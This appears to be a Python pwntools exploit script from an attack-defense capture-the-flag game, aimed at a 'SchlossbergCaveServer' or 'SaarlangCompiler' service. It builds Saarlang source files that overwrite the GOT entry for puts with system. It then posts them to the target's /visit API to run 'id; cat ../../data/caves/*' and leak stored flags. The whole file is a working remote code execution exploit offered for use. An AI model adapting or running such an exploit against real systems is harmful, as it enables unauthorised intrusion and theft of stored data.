from __future__ import print_function, unicode_literals
import os
import requests

os.environ['TERM'] = 'xterm'
from pwn import *

context.arch = 'amd64'


def pack_cmd(cmd):
	cmd = cmd + '\x00'
	result = ['eija command() gebbtserick lischd byte: {',
			  '\tvar a: lischd byte = neie lischd byte ({});'.format(len(cmd))]
	for i, c in enumerate(cmd):
		result.append('\ta@{} = {};'.format(i, ord(c)))
	result += ['\tserick a;', '}']
	return '\n'.join(result)


def get_attack_scripts(command, attack_compiler=False, local=True):
	if not local and attack_compiler:
		print("Using binary 'vulnbox/SaarlangCompiler' ...")
		elf = ELF('vulnbox/SaarlangCompiler')
	elif not local:
		print("Using binary 'vulnbox/SchlossbergCaveServer' ...")
		elf = ELF('vulnbox/SchlossbergCaveServer')
	elif attack_compiler:
		print("Using binary '../../backend/cmake-build-debug/SaarlangCompiler' ...")
		elf = ELF('../../backend/cmake-build-debug/SaarlangCompiler')
	else:
		print("Using binary '../../backend/cmake-build-debug/SchlossbergCaveServer' ...")
		elf = ELF('../../backend/cmake-build-debug/SchlossbergCaveServer')
	
	print(elf.symbols)
	print(elf.got)

	code1 = '''
	const got_puts: lischd int = neie lischd int (0);
	'''

	code2 = '''
	const got_puts: int = {};
	'''.format(elf.got['puts'] - 8)

	code3 = '''
	holmol "code1.sl";
	holmol "stdlib.sl";
	
	{}
	
	eija main() gebbtserick int: {{
		got_puts@0 = {};
		mach sahmol_as_str(mach command());
	}}
	'''.format(pack_cmd(command), elf.symbols['system'])
	return {'code1.sl': code1, 'code2.sl': code2, 'entry.sl': code3}


# attack the test compiler
# print(get_attack_script('id && id && id', True))

def exploit(target, local=False):
	url = 'http://{}:9080/api'.format(target)
	# newest cave
	print(url)
	caveId = requests.get(url + '/caves/list').json()[-1]['id']
	# code execution - leak all flags
	attackscripts = get_attack_scripts('id; cat ../../data/caves/*', False, local)
	response = requests.post(url + '/visit', json={"cave_id": caveId, "files": attackscripts})
	print('Status:', response.status_code)
	print(response.text)


if __name__ == '__main__':
	if len(sys.argv) > 1:
		exploit(sys.argv[1], False)
	else:
		exploit('localhost', True)
